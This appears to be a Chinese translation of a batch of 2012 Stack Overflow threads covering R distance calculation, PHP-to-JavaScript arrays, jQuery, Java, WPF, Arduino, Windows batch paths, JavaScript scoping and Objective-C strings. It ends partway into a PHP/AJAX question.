我必须计算训练数据和测试数据之间的欧几里得距离。train数据的总长度为1389，测试数据为364。基本上是美国邮政信封上手写邮政编码的数据，从“Elements of Statistical learning”[网站下载。](http://www-stat.stanford.edu/~tibs/ElemStatLearn/)

我是初学者，只是阅读 R 包中的数据。我无法开始计算火车和测试数据之间的距离。谁能帮我告诉我如何为这些数据生成一个循环？

我会很感激的。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-19T02:31:46.377

对于欧几里得距离，我喜欢`rdist`从`fields`包中使用。`dist`该软件包的一个优点`stats`是它可以将两个矩阵作为输入：

```
train.data <- matrix(runif(1389*2), ncol = 2)
test.data  <- matrix(runif(364*2),  ncol = 2)

library(fields)
distances <- rdist(train.data, test.data)
dim(distances)
# [1] 1389  364 
```

# php - 将 PHP 数组传递给 Javascript 数组

> ID：10220642
> 
> 赞同：5
> 
> 时间：2012-04-19T01:58:22.873
> 
> 标签：php, javascript

参考标题。我有一个这样编码的数组：-

```
$query = "SELECT * FROM server";
$result = mysql_query($query);
$dServer = array();

while($row = mysql_fetch_assoc($result)) {
    $dServer[] = $row['model'];
} 
```

现在，如何将**$dServer**数组传递给 Javascript 数组？

例如，这个数组：

```
var a = new Array(); 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-04-19T02:01:56.083

```
$query = "SELECT * FROM server";
$result = mysql_query($query);
$dServer = array();

while($row = mysql_fetch_assoc($result)){
    $dServer[] = $row['model'];
}    

?>
<script type="text/javascript">
    var a = <?php echo json_encode($dServer); ?>;
</script> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-19T02:01:11.463

将其编码为 json 对象。

```
<?
    $arr = array('entry' => 'content');
?>

<script>
var data = <?=json_encode($arr);?>;
alert(data['entry']);
</script> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-19T02:00:38.253

尝试使用 ajax 请求和[json_encode](http://php.net/manual/ru/function.json-encode.php)。

第二种变体

```
<?php
$query = "SELECT * FROM server";
$result = mysql_query($query);
$dServer = array();

     while($row = mysql_fetch_assoc($result))
      {
              $dServer[] = $row['model'];
      }    
?>
var a = <?php echo json_encode($dServer);?>; 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-19T02:46:47.580

除了上面提到的ajax/json方法外，还可以直接打印出值：

```
<?php
  $query = "SELECT * FROM server";
  $result = mysql_query($query);
?>

<script type="text/javascript">
  var a = new Array();

<?php
  while($row = mysql_fetch_assoc($result)){
    echo "a['model'] = " . $row['model'] . ";"; 
    echo "a['nextField'] = " . $row['nextField'] . ";"; 
  }
?>
</script> 
```

# facebook - 进行了电话验证，但 facebook 没有提供我们的 AppId

> ID：10220648
> 
> 赞同：0
> 
> 时间：2012-04-19T01:58:55.650
> 
> 标签：facebook, app-id

我们需要使用 Facebook Javascript SDK。

我们按照说明为我们的网站获取“Ap​​pId”：

1) 登录到一个有效的 Facebook 帐户

2) 在这里查看如何获取应用程序 ID => [http://developers.facebook.com/docs/guides/web/](http://developers.facebook.com/docs/guides/web/)

3) 在页面顶部 1/5 附近它说：“JavaScript SDK 要求您在 Facebook**注册您的网站**以获取 App ID（或 appId）。”

4) 我点击了“**注册您的网站**”链接

5）我点击了该页面上的“转到应用程序”按钮，它把我们带到了这里：=">https://developers.facebook.com/apps# *=*

6) 点击“+创建新应用”按钮

7）它提示我们输入一个名称，我们输入了没有.com的网站名称

8) 它提示我们进行“电话验证”

9）当我们输入它发短信到我们手机的代码时，它说“验证成功”

10) 然后什么都没有——没有 AppId。

我们如何找到我们的 AppId？我们的验证成功了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T03:17:27.680

看起来您遵循的程序是正确的。

导航到 后`https://developers.facebook.com/apps#=`，您应该会看到类似这样的内容

![在此处输入图像描述](../Images/3fe710a3212c9b073bff0634642bf8b3.png)

在左栏中选择您想要的应用程序，您将看到详细信息，该`Summary`部分最顶部是 App ID/API Key

希望这可以帮助

# set - 你会如何处理这个谜题？（仅查找数字的唯一因素。）

> ID：10220649
> 
> 赞同：2
> 
> 时间：2012-04-19T01:59:03.223
> 
> 标签：set, factorization

我正在研究 Interview Street 的“Unfriendly Numbers”谜题。

它是这样的：

给定一个整数和另一个整数列表，找出仅对给定整数唯一且不与其他整数列表共享的因子。

因此，如果集合 1（集合 Y）是（并且 n 是给定的数字）：

∃Y{z|n % z = 0}

基本上：每个 z 都有一个 Y，其中 z 是一个数字，其中 n % z 为 0。

我们想要 Y 的集合差减去包含其他数字列表的所有因子的集合。

那么你将如何处理这个问题？

求整数 n 的因数？其他数字的所有因素，只是剔除非唯一因素？

或者你会只找到 n 的因子，然后用它们来划分其他数字并剔除非唯一的数字吗？

或者有没有办法在不考虑数字的情况下做到这一点？

到目前为止，我已经使用了 Trial Division、Pollard 的 Rho、Brent 的 Pollard 的 Rho 变体和 Fermat 的因式分解方法。我还使用了 Lucas-Lehmer 素性检验和 Euclids GCD。

但到目前为止，什么都没有，只是错误答案的组合或超过了时间限制。一个已知的解决方案据称涉及轮初筛，但我不确定那是什么。

不管怎么说，多谢拉。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T15:38:23.633

让你的列表大小为 x，数字为 n。然后期望 x* sqrt(n) 的时间复杂度

1-找到所有素数直到 n 的 sqrt

2-对于除n但列表中没有元素的每个素数，添加到结果集中

3- 返回结果集

```
public static List<Integer> uniqueFactors(int n, int[] list){
    //find possible prime factors of n: O(sqrt(n))
    int factors = (int)Math.sqrt(n);
    boolean [] P = new boolean[factors+1];
    Arrays.fill(P, true);
    P[0]=P[1]= false;//0 and 1 are not primes
    int limit =(int) Math.sqrt(factors)+1;//prime search limit
    for(int i=2; i <= limit; i++ )
        if(P[i]) {
            int y;
            for(int x=2; (y=x*i)<=factors; x++)
                if(P[y])
                    P[y]=false;
        }
    //retrieve/identify all prime factors of n that are not prime factors of elements in list
    //O is sqrt(n) * list
    List<Integer> result = new ArrayList<Integer>();
    for(int i=2; i<=factors; i++)
        if(P[i] && n%i==0) {//if i is prime and a factor of n
            boolean shared = false;
            for(int el: list)
                if(el%i==0) {
                    shared=true;
                    break;
                }
            if(!shared)
                result.add(i);
        }//if
    return result;
}//uniqueFactors 
```

测试

```
public static void main(String[] args) {
    int n=2*3*5*7*11*13*17*19;
    int list[]= {8,9,25,98,121,38};
    System.out.println(uniqueFactors(n,list));
}

print out: [13, 17] 
```

我运行的解决方案的所有其他变体仍然以 Big-O 结尾： sqrt(n) * list_size

# jquery - jquery 库无法正常工作

> ID：10220650
> 
> 赞同：-1
> 
> 时间：2012-04-19T01:59:07.317
> 
> 标签：jquery

我的 jquery 库出现错误。当我在底部附近结束脚本时，错误发生在附近，我添加了 java for 循环，因为图片命名为 0-170：

```
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.js"></script>

<!-- load Galleria -->
<script src="galleria-1.2.7.min.js"></script>

</head>
<body>
    <div class="content">
        <h1>Galleria Classic Theme</h1>
        <p>Demonstrating a basic gallery example.</p>

        <!-- Adding gallery images. We use resized thumbnails here for better performance, but it’s not necessary -->

<script src="jquery.js"></script> 
<script>
$(document).ready 
      var galleria = $('#galleria') 
      for(var i=0;i<170;i++){     
      var imgName = "images/"+i+".JPG"     
      galleria.append('<a href="'+imgName+'"><img src="'+imgName+'"></a>')
      {

    // Load the classic theme
    Galleria.loadTheme('galleria.classic.min.js');

    // Initialize Galleria
    Galleria.run('#galleria');

       </script>
    <script src="jquery.js"></script>

    </body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T02:27:09.403

您正在从 googleapis.com 加载 jQuery 版本 1。图库插件可能需要更新版本的 jQuery。

当前版本是 1.7.2：

```
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript"></script> 
```

[http://docs.jquery.com/Downloading_jQuery#CDN_Hosted_jQuery](http://docs.jquery.com/Downloading_jQuery#CDN_Hosted_jQuery)

此外，您缺少很多括号和方括号。我也建议在行尾使用分号。

jQuery 就绪函数接受一个函数作为它的参数，所以你需要这样的东西：

```
$(document).ready( function(){
    <your code here>
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T02:01:51.327

认为可能是您加载了 jquery.js 三次

# java - python list.index（）的Java数组模拟？

> ID：10220654
> 
> 赞同：0
> 
> 时间：2012-04-19T01:59:35.690
> 
> 标签：java, python, list

对于 Python，我可以做一些事情，比如`array.index(element)`获取`index`for `element`in `array`。我如何在 Java 中使用常规数组而不是 arrayList 来做到这一点？有没有类似的功能？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-19T02:08:25.203

您可以使用`Arrays.asList`然后使用`List.indexOf`. 其他使用建议`Arrays.binarySearch`很好，但需要对数组进行排序。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-19T02:05:23.977

您必须使用[`Arrays.binarySearch`](http://docs.oracle.com/javase/6/docs/api/java/util/Arrays.html)方法（必须对数组进行排序）。

如果对数组进行排序是不可接受的，那么您只有一个解决方案 - 全扫描。只需遍历数组即可找到元素的索引。`Arrays.asList`同样可以通过使用列表的`indexOf`方法将数组转换为列表来实现。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-19T02:09:11.150

你可以做：

```
Arrays.asList(regularArray).indexOf(elementYouWant); 
```

或者，如果数组已排序，您可以使用

```
Arrays.binarySearch(); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-19T02:09:45.530

如果你不想使用 Java Collections 可以使用这个。你需要在你的类中实现 equals 方法。

```
public int index(Object[] array, Object element) {
    for(int i = 0; i < array.lenght; i++) {
        if (array[i] == element) {
            return i;
        }
        if (array[i].equals(element) {
            return i;
        }
    }
    return -1;
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-19T02:12:47.617

最好的方法是编写自己的函数。每个内置方法都有问题，例如 binarySearch 需要排序数组或为 asList 方法创建新列表对象。

使用这样的方法。

```
public int index( int search, int[] arr ){
  for( int i=0; i< arr.length ; i ++ )
    if( arr[ i ] == search)
     return i;
  return -1;
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-04-19T02:09:13.763

有几种方法

1) Arrays.binarySearch

2）或者你可以循环并找到它。

```
 public int getArrayIndex(int[] myArray, obj myObject)
{
  int length = Array.getLength(myArray);//get the size of the array
  for (int i = 0; i < lenght; ++i)
   {
     if (myArray[i] == myObject)
      {
        return(i);
      }
    }
   return(-1);//didn't find what I was looking for
  } 
```

# wpf - Wpf MVVM UI 不更新实现模块化，事件聚合器

> ID：10220661
> 
> 赞同：0
> 
> 时间：2012-04-19T02:00:42.653
> 
> 标签：wpf, mvvm, eventaggregator

我目前正在使用 prism IEventAggregator 在不同模块的两个视图之间试验 wpf 通信。发布模块和订阅模块工作正常，由于某种原因，我不明白为什么订阅者 UI 没有更新。我在订阅者模块上放置了一个按钮来显示一个 msgbox，以确保它接收到它并且它确实接收到它。我认为我正确实施了 INotifyPropertyChanged。

如果我将订阅放在订阅者视图的代码隐藏中，它可以按我的意愿工作....我做错了吗？请纠正我。谢谢。

用于模块消息传递的单独类。这门课来自这篇文章 http://www.shujaat.net/2010/12/wpf-eventaggregator-in-prism-40-cal.html

```
Public Class SendServices
Public Shared Property SendMessage As EventAggregator

Shared Sub New()
    SendMessage = New EventAggregator
End Sub
End Class 
```

出版商：

```
Public Class Module1ViewModel

Private _msgsend As String
Public WriteOnly Property MessageSend As String
    Set(value As String)
        _msgsend = value
    End Set
End Property

Public Sub Send()
    SendServices.SendMessage.GetEvent(Of SendStringEvent).Publish(New SendString With {.Name = _msgsend})
End Sub
End Class 
```

订户：

```
Public Class Module2ViewModel
Implements INotifyPropertyChanged

Private _receivedMSG As String
Public Property ReceivedMSG As String
    Get
        Return _receivedMSG
    End Get
    Set(value As String)
        _receivedMSG = value

        OnPropertyChanged("ReceivedMSG")
    End Set
End Property
'Binded to subscriber View button using interactions
Public Sub Received()
    MsgBox(ReceivedMSG)
End Sub

Private Sub ReceivedMessage(msg As SendString)
    _receivedMSG = msg.Name
End Sub

Public Sub New()
    SendServices.SendMessage.GetEvent(Of SendStringEvent)().Subscribe(AddressOf ReceivedMessage, ThreadOption.UIThread, False)
End Sub

Public Event PropertyChanged As PropertyChangedEventHandler Implements INotifyPropertyChanged.PropertyChanged
Protected Sub OnPropertyChanged(ByVal name As String)
    RaiseEvent PropertyChanged(Me, New PropertyChangedEventArgs(name))
End Sub
End Class 
```

订阅者查看代码隐藏

```
Public Class Module2View
    Sub New()
        InitializeComponent()
        Me.DataContext = New Module2ViewModel
    End Sub
End Class 
```

以及显示消息的绑定部分

```
<TextBox Height="23" HorizontalAlignment="Left" Margin="111,39,0,0" Name="TextBox1" VerticalAlignment="Top" Width="158" Text="{Binding Path=ReceviedMSG}"/> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T05:12:09.933

您不会触发`OnPropertyChanged`事件，因为您直接`_receivedMSG`在处理程序中设置字段，绕过触发事件的属性设置器。

所以你应该改用属性设置器：

```
Private Sub ReceivedMessage(msg As SendString)
    ReceivedMSG = msg.Name
End Sub 
```

# c++ - 使用 Arduino 进行 LCD 编程

> ID：10220673
> 
> 赞同：2
> 
> 时间：2012-04-18T23:51:27.287
> 
> 标签：c++, arduino

我希望我的 LCD 显示“Voltage =（sensorValue）”，但现在我可以让程序在我转动电位器时识别该值的唯一方法是，如果我把它放在一个循环中。但是当我把它放在一个循环中时，整个屏幕会充满 1s、2s、3s、4s 或 5s，具体取决于电位器的设置位置。

如果我没有将它放在一个循环中，那么无论电位器的设置是什么，都会在屏幕上弹出，并且如果电位器转动则不会改变。

如何将循环的结果放在循环之外，以便我可以拥有“（Voltage = sensoreValue）”？

这是我的程序：

```
#include <Wire.h> 
#include <LiquidCrystal_I2C.h>

LiquidCrystal_I2C lcd(0x27,16,2);  

void setup()
{
    lcd.init();                      
    lcd.backlight();
    int sensorPin = A0;
    int sensorValue = 0;
    sensorValue = 0.004882812 * analogRead(sensorPin) + 1;
    lcd.print("Voltage=");
}

void loop()
{
    int sensorPin = A0;
    int sensorValue = 0;
    sensorValue = 0.004882812 * analogRead(sensorPin) + 1;
    lcd.print(sensorValue);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T02:53:45.700

您要求它打印读数并且它正在执行 - 它正在打印每个读数！

我怀疑您要么希望它仅在值更改时才打印

```
int sensorValue = 0;
int prevValue = 0;

void loop()
{    
    sensorValue = 0.004882812 * analogRead(sensorPin) + 1;
    if (sensorValue != prevValue) {
       lcd.print(sensorValue);
       prevValue == sensorValue;
    }
} 
```

或者，如果您的显示器 lcd.print 支持，您可以打印“n”个退格，以便新值打印在旧值的顶部

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T15:51:10.307

听起来`print()`每次调用时都会清除先前数据的屏幕（尽管[此处](http://hmario.home.xs4all.nl/arduino/LiquidCrystal_I2C/)和[此处](http://www.arduino.cc/playground/Code/LCDAPI)可用的相关文档和库代码尚不清楚）。

如果是这种情况，您需要`Voltage=`在循环中打印字符串以及传感器值。尝试将您的代码更改为：

```
#include <Wire.h> 
#include <LiquidCrystal_I2C.h>

LiquidCrystal_I2C lcd(0x27,16,2);  
int sensorPin = A0;

void setup()
{
    lcd.init();                      
    lcd.backlight();
}

void loop()
{
    int sensorValue = 0.004882812 * analogRead(sensorPin) + 1;
    String display = "Voltage=";
    display += sensorValue;
    lcd.print(display);
} 
```

# windows - 将批处理文件中的绝对路径转换为相对路径

> ID：10220675
> 
> 赞同：7
> 
> 时间：2012-04-19T02:02:45.553
> 
> 标签：windows, batch-file, relative-path, absolute-path

是否可以将绝对路径转换为批处理文件中的相对路径？（与[此](https://stackoverflow.com/questions/1645843/batch-file-resolve-absolute-path-from-relative-path-and-or-file-name)相反）。显然，您需要两个输入：要转换的绝对路径，以及您希望将其相对化的绝对参考路径。

例如：

```
Path to convert: c:\documents\mynicefiles\afile.txt
Reference path:  c:\documents
Result:          mynicefiles\afile.txt 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-19T03:54:35.800

```
@echo off
setlocal EnableDelayedExpansion
set Path_to_convert=c:\documents\mynicefiles\afile.txt
set Reference_path=c:\documents
set Result=!Path_to_convert:*%Reference_path%\=!
echo Result: %Result% 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-16T16:39:11.723

如果您想从字符串的开头删除 %cd% ，这是另一种有效的方法。它很慢，但如果情况允许，您可以减少循环次数。

```
call :removeCommonAtStart outvar C:\Users\Public\Documents\ASUSAccess

:removeCommonAtStart
:: Description: loops through two strings and sets new variable representing unique data
:: Required parameters:
:: name - name of the variable to be returned
:: test - string to have common data removed from start
:: Optional parameters:
:: remove - string if not defined then use %cd% as string.
:: Required functions:
:: removelet
set name=%~1
set test=%~2
set remove=%~3
if not defined remove set remove=%cd%
set endmatch=
FOR /L %%l IN (0,1,150) DO if not defined notequal call :removelet
goto :eof

:removelet
:: Description: called by removeCommonAtStart to remove one letter from the start of two string variables
:: Required preset variables:
:: test
:: remove
:: name
set test=%test:~1%
set %name%=%test:~1%
set remove=%remove:~1%
if "%test:~0,1%" neq "%remove:~0,1%" set notequal=on&exit /b
goto :eof 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-11-13T17:07:21.963

下面是一个“dostips”解决方案。
在使用的操作级别上相当模糊，但非常有效！

*标题中提供的示例应有助于理解此宏的用法。

```
::=//////////////////////////////////////////////////////////////////////////
::= Makes a file name relative to a base path.
::= *param-1:  file [in,out]  - variable with file name to be converted, or file name itself for result in stdout
::= *param-2:  base [in,opt*] - base path | *leave blank for current directory
::= *return:   The resolved relative path is stored into *param-1
::=
::= SAMPLE*HOW-TO-USE:
::=  a) Current path       =D:\titi\toto\
::=  b) DATAPATH_absolute  =D:\titi\tata\tutu\log.txt
::=  c) --relativize the data-path--
::=
::=    c1) INIT the data:
::=        $>  set DATAPATH_relative=%DATAPATH_absolute%
::=
::=    c2) CALL the sub-function:
::=        $>  call  :MakeRelative  DATAPATH_relative
::=
::=    c3) (( After the call, result is set in %DATAPATH_relative% ))
::=
::=  d) echo DATAPATH_relative =%DATAPATH_relative%
::=                     /--->   "..\tata\tutu\log.txt"
::=
::= $source https://www.dostips.com
::= **web:  https://www.dostips.com/?t=Function.MakeRelative
::= **web:  https://www.dostips.com/DtCodeCmdLib.php#Function.MakeRelative
::=--------------------------------------------------------------------------

:MakeRelative
    SETLOCAL ENABLEDELAYEDEXPANSION

    set src=%~1
    if defined %1 set src=!%~1!
    set bas=%~2
    if not defined bas set bas=%cd%

    for /f "tokens=*" %%a in ("%src%") do set src=%%~fa
    for /f "tokens=*" %%a in ("%bas%") do set bas=%%~fa
    set mat=&rem variable to store matching part of the name
    set upp=&rem variable to reference a parent

    for /f "tokens=*" %%a in ('echo.%bas:\=^&echo.%') do (
        set sub=!sub!%%a\
        call set tmp=%%src:!sub!=%%
        if "!tmp!" NEQ "!src!" (set mat=!sub!) ELSE (set upp=!upp!..\)
    )

    set src=%upp%!src:%mat%=!
    ( ENDLOCAL & REM RETURN VALUES
        IF defined %1 (SET %~1=%src%) ELSE ECHO.%src%
    )
    EXIT /b 
```

[DosTips.com, :MakeRelative](https://www.dostips.com/?t=Function.MakeRelative)

# javascript - Javascript全局变量不起作用

> ID：10220678
> 
> 赞同：2
> 
> 时间：2012-04-19T02:04:15.473
> 
> 标签：javascript, global-variables

我在 JavaScript 中遇到全局变量问题。我尝试做的是在函数外部声明变量，然后在函数内更改它，然后调用另一个函数。从我读过的内容来看，这应该有效，但它只是让我不确定。这是我正在制作的卡片绘图游戏的代码。

```
var randSuit;
function getRandCard() {
    var randNum;
    var randSuit;
    var randVal;
    randNum = Math.floor(Math.random()*13)+1;
    if (randNum == 1) {
        randVal = "2";
    } else if (randNum == 2) {
        randVal = "3";
    } else if (randNum == 3) {
        randVal = "4";
    } else if (randNum == 4) {
        randVal = "5";
    } else if (randNum == 5) {
        randVal = "6"; 
    } else if (randNum == 6) {
        randVal = "7";
    } else if (randNum == 7) {
        randVal = "8";
    } else if (randNum == 8) {
        randVal = "9"; 
    } else if (randNum == 9) {
        randVal = "10";
    } else if (randNum == 10) {
        randVal = "Jack";
    } else if (randNum == 11) {
        randVal = "Queen";
    } else if (randNum == 12) {
        randVal = "King";
    } else if (randNum == 13) {
        randVal = "Ace";
    }

    randNum = randNum = Math.floor(Math.random()*4)+1;

    if (randNum == 1) {
        randSuit = "Hearts";
    } else if (randNum == 2) {
        randSuit = "Clubs";
    } else if (randNum == 3) {
        randSuit = "Spades";
    } else if (randNum == 4) {
        randSuit = "Diamonds";
    }

    console.log(randSuit);
    var randCard = (randVal + " of " + randSuit);
    //Return the Value of the randomly chosen Card.
    return (randCard);
}

//This function calls the random card from the function above, then applies logic to see if it's the same, then outputs the result.
$(function() {
    $('#drawCard').click(function() {

        var e = document.getElementById("faceValue");
        var faceValue = e.options[e.selectedIndex].text;
        var e = document.getElementById("suit");
        var suit = e.options[e.selectedIndex].text;

        $('#oneCardContainer').slideDown('slow');
        var pickedCard = (faceValue + " of " + suit);

        var randCard = getRandCard();
        console.log (randSuit);

        if (pickedCard == randCard) {
            $("#oneCardResults").val("You Chose a " + pickedCard + " and got a " + randCard + ". \nYou Win!");
        } else if (pickedCard != randCard) {

            $("#oneCardResults").val("You Chose a " + pickedCard + " and got a " + randCard + ". \nYou Lose!");

        }
    });
}); 
```

那是我尝试过的代码，我尝试传递的变量是 randSuit。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-19T02:06:10.730

您正在定义一个名为 的全局变量`randSuit`，但*也*定义了一个同名的局部变量。当你这样做时`randSuit = randSuit;`，实际上什么都没有发生，因为左侧和右侧都在引用局部变量。您需要以不同的方式命名它们。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-19T02:15:47.383

@Elliot Bonneville 和 @jfriend00 的答案很好，但这里是对局部和全局变量问题背后的理论的一些解释。

JavaScript 使用全局变量和局部变量的方式是，当解释器遇到标识符时，它会在当前范围内搜索它（在您的情况下为：）`getRandCard`，如果找不到它 - 解释器会转到上面的一个范围，如果它在那里找不到它 - 它会在上面两个范围内等等。

```
randSuit = randSuit; 
```

在这一行中，这些标识符都将引用同一个局部变量，因为解释器会在本地范围内找到它们，所以这一行实际上什么都不做。

为了引用全局变量，您应该创建对其范围的引用：

```
var randSuit;
var that = this;    

function getRandCard() {
    ...
} 
```

然后，替换：

```
randSuit = randSuit; 
```

和：

```
that.randSuit = randSuit; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-19T02:06:52.270

您`randSuit`在函数内部重新声明；该声明隐藏了 global `randSuit`，因此您的函数正在修改自己的局部变量而不是全局变量。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-19T02:12:54.670

当您在函数内部重新声明 randsuit 时，它被私有化为该函数

```
var randSuit = 5; // not shared
function getRandCard() {
    var randSuit = 3; // not shared
    console.log(randSuit);
}
getRandCard();
console.log(randSuit); 
```

[​http://jsfiddle.net/PbBph/](http://jsfiddle.net/PbBph/)

如果你想分享`randSuit`不要重新声明变量的输出

```
var randSuit = 5; // shared
function getRandCard() {
    randSuit = 3; // shared
    console.log(randSuit);
}
getRandCard();
console.log(randSuit); 
```

[http://jsfiddle.net/PbBph/1/](http://jsfiddle.net/PbBph/1/)

更好的选择是模块化卡片变量和方法

```
var cardStack = (function () {
   var randSuit; // protected from global

   return {
      getRandSuit: function () { return randSuit; }, // but still readable
      getRandCard: function () { .... }
   };

}());

var card = cardStack.getRandCard();
    suit = cardStack.getRandSuit(); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-19T02:12:18.863

试试这个，它是你的代码的缩短版本，应该可以工作：

```
var randSuit;
function getRandCard() {
    var randNum, randVal;

    var upperCards = ["Jack", "Queen", "King", "Ace"];
    var suits = ["Hearts", "Clubs", "Spades", "Diamonds"];

    randNum = Math.floor(Math.random()*13)+1;
    (randNum < 10) ? randVal++ : randVal = upperCards[randNum-10];

    randSuit = suits[Math.floor(Math.random()*4)];

    // return the value of the randomly chosen card.
    return (randVal + " of " + randSuit);
} 
```

我使用了一些数组和一个三元运算符来大大缩短您的代码。我还消除了不必要的局部`randSuit`变量，它被限定并覆盖了您的全局对象。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-04-19T02:18:15.937

如果要使用全局变量，请全局定义变量，不要在本地重新定义，只需在本地使用即可。当您在本地重新定义它时，您将创建一个具有相同名称的新局部变量，以取代该范围内的全局变量。

* * *

其余部分实际上是评论，但是由于无法在评论中有效地包含代码，因此我将其作为答案的一部分发布。您确实需要将 DRY（不要重复自己）原则应用于您的代码。这是可怕的重复：

```
randNum = Math.floor(Math.random()*13)+1;
if (randNum == 1) {
    randVal = "2";
} else if (randNum == 2) {
    randVal = "3";
} else if (randNum == 3) {
    randVal = "4";
} else if (randNum == 4) {
    randVal = "5";
} else if (randNum == 5) {
    randVal = "6"; 
} else if (randNum == 6) {
    randVal = "7";
} else if (randNum == 7) {
    randVal = "8";
} else if (randNum == 8) {
    randVal = "9"; 
} else if (randNum == 9) {
    randVal = "10";
} else if (randNum == 10) {
    randVal = "Jack";
} else if (randNum == 11) {
    randVal = "Queen";
} else if (randNum == 12) {
    randVal = "King";
} else if (randNum == 13) {
    randVal = "Ace";
}
randNum = randNum = Math.floor(Math.random()*4)+1;

if (randNum == 1) {
    randSuit = "Hearts";
} else if (randNum == 2) {
    randSuit = "Clubs";
} else if (randNum == 3) {
    randSuit = "Spades";
} else if (randNum == 4) {
    randSuit = "Diamonds";
} 
```

并且可以用这个重复性更少的代码代替：

```
var cards = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "Jack", "Queen", "King", "Ace"];
randVal = cards[Math.floor(Math.random() * cards.length)];

var suits = ["Hearts", "Clubs", "Spades", "Diamonds"];
randSuit = suits[Math.floor(Math.random() * suits.length)]; 
```

# objective-c - NSCFString 和 NSConstantString 有什么区别？

> ID：10220683
> 
> 赞同：13
> 
> 时间：2012-04-19T02:04:29.680
> 
> 标签：objective-c, nsstring

我将对象变量声明为a`NSString` 但是当我使用XCode查看我的对象时，我看到有两种类型的String，似乎系统自动转移到另一种：

![在此处输入图像描述](../Images/a9ed1902b1adfac742c226759084788e.png)

它们之间有什么不同？它们是否可以相互替换。另外，两个变成另一个的条件是什么？

谢谢。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-04-19T02:24:19.487

它们都是`NSString`. `__NSCFString`是在运行时通过 Foundation 或 Core Foundation 创建的，`__NSCFConstantString`而是`CFSTR("...")`常量或`@"..."`常量，在编译时创建。

它们的接口是私有的。把它们都当作`NSString`，你应该没有麻烦。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-19T02:17:39.320

据我所知，`NSCFConstantString`是一种`NSString`将字符串数据保存在代码内存中的实现。`@"string"`当您使用常量时，编译器会创建它的实例。由于子类/超类关系，您可以在任何可以使用`NSCFConstantString`的地方`NSString`使用，但显然不是相反。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-19T02:17:47.713

它似乎是编译器完成的优化。我猜想转换为 an 的字符串`NSCFConstantString`等于出于性能原因缓存的常量之一。你`NSCFString`只是一个免费的桥接字符串，可以是一个`NSString`或一个`CFString`。有关更多信息，请参阅[本文](http://www.cocoanetics.com/2012/03/beware-of-nsstring-optimizations/)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-04-17T16:44:13.007

将 NSString 转换为 NSCFConstantString 的好处之一是下一个示例：

例如 - 在 tableView 的方法 cellForRowAtIndexPath 中，如果你会写

```
NSString *ident = @"identificator"; 
NSLog(@"%p", ident); 
```

比每个单元格的地址都相同。但是对于 NSLog(@"%p", &ident) ，每个单元格的地址都会不同。

> NSString ident = @"identificator" 是一种特殊情况 - 它被创建为 __NSCFConstantString 类，因此所有相等的字符串文字将共享相同的内存地址以优化内存使用。&ident 将获得一个指向 NSString 的局部变量的地址，并且将具有 NSString** 类型。

[参考](https://stackoverflow.com/a/7555194/5790492)来源（评论）。

# internet-explorer - Testing for IE8 and IE7 using IE9?

> ID：10220684
> 
> 赞同：4
> 
> 时间：2012-04-19T02:04:53.237
> 
> 标签：internet-explorer, internet-explorer-8, internet-explorer-9

Can anyone comment on the accuracy of the IE7 and IE8 modes when usinf IE9? [http://lifeonubuntu.com/how-to-test-ie9-ie8-and-ie7-from-the-same-computer/](http://lifeonubuntu.com/how-to-test-ie9-ie8-and-ie7-from-the-same-computer/)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-19T02:11:50.427

Swapping out your Browser Mode is very reliable in testing various versions of IE. Granted, you're not actually running in IE7 when you tell IE10 to Emulate IE7, but you probably won't find many differences between the two.

I use this many times a day to test various different websites, with a great deal of accuracy. For further reading, I'd encourage you to check out [Testing sites with Browser Mode vs. Doc Mode](http://blogs.msdn.com/b/ie/archive/2010/10/19/testing-sites-with-browser-mode-vs-doc-mode.aspx).

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-12T13:38:32.933

我更喜欢在 OS X 上使用单独的虚拟机在 IE7、IE8、IE9 中并行测试我的网站。 [这篇博文](http://www.markomedia.com.au/ie6-ie7-ie8-ie9/)解释了如何做到这一点，这很简单。

# php - 只允许 PHP 文件在上一个网页的“授权”下运行

> ID：10220685
> 
> 赞同：1
> 
> 时间：2012-04-19T02:04:58.073
> 
> 标签：php, ajax

> **可能重复：**
> [仅 AJAX 访问](https://stackoverflow.com/questions/1393904/ajax-only-access)

因此，我根据谁赢得了比赛来运行这些 javascript 函数。

```
function winA() 
{
